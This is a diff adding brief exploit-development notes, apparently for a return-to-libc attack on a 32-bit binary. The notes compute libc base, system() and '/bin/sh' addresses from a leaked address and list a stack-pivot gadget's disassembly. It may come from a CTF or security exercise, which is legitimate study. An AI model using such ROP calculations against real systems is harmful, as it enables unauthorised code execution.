@@ -1,0 +1,13 @@
+libc_start_main addr : 0x555a0d50
+base_addr : 0x555a0d50-0x17D50 = 0x55589000
+
+system addr : 0x55589000+0x3B510 = 0x555c4510
+binsh_addr : 0x55589000+0x15E433 = 0x556e7433
+
+gadget addr : 0x55589000+0x179AC = 0x555a09ac
+.text:000179AC loc_179AC:                              ; CODE XREF: backtrace_and_maps+38j
+.text:000179AC                 add     esp, 50Ch
+.text:000179B2                 pop     ebx
+.text:000179B3                 pop     esi
+.text:000179B4                 pop     edi
+.text:000179B5                 pop     ebp
